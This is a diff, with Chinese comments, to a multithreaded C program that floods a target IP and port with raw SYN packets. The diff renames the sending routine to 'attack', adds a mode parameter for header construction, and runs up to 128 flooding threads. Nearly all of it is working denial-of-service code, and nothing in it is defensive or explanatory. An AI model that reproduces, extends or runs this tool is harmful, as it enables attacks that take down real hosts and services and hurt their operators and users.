@@ -9,8 +9,8 @@
 #include <netdb.h>
 #include <errno.h>
 #include <pthread.h>
-#include "../header/CRC16_check.h"
-#include "../header/init_header.h"
+#include "header/CRC16_check.h"
+#include "header/init_header.h"
 
 /* 最多線程數 */
 #define MAXCHILD 128
@@ -24,11 +24,14 @@ static int alive = -1;
 char dst_ip[20] = { 0 };
 int dst_port;
 
+/* mode */
+char mode;
+
 /* 發送SYN包函数
  * 填寫IP頭部，TCP頭部
  * TCP偽頭部僅用於校驗和的计算
  */
-void* send_synflood(void *addr_info){
+void* attack(void *addr_info){
         struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
 	char buf[100], sendbuf[100];
 	int len;
@@ -40,7 +43,7 @@ void* send_synflood(void *addr_info){
 	len = sizeof(struct iphdr) + sizeof(struct tcphdr);
 	
 	/* 初始化頭部 */
-	init_header(&ip_hdr, &tcp_hdr, &pseudoheader, dst_ip, dst_port);
+	init_header(&ip_hdr, &tcp_hdr, &pseudoheader, dst_ip, dst_port, mode);
 	
 	/* 處於活動狀態時持續發送SYN包 */
 	while(alive){
@@ -86,13 +89,14 @@ int main(int argc, char *argv[]){
 	pthread_t pthread[MAXCHILD];
 	int err = -1;
 
+	mode = (char)*argv[3];
 	alive = 1;
 	/* 截取信號CTRL+C */
 	signal(SIGINT, sig_int);
 
 	/* 参數是否數量正鴂 */
-	if(argc < 3){
-		printf("usage: syn <IPaddress> <Port>\n");
+	if(argc < 4 || argc > 4){
+		printf("usage: syn <IPaddress> <Port> <mode>\n");
 		exit(1);
 	}
 
@@ -141,7 +145,7 @@ int main(int argc, char *argv[]){
 
 	/* 建立多个線程協同工作 */
 	for(i=0; i<MAXCHILD; i++){
-		err = pthread_create(&pthread[i], NULL, send_synflood, (void *)&addr);
+		err = pthread_create(&pthread[i], NULL, attack, (void *)&addr);
 		if(err != 0){
 			perror("pthread_create()");
 			exit(1);
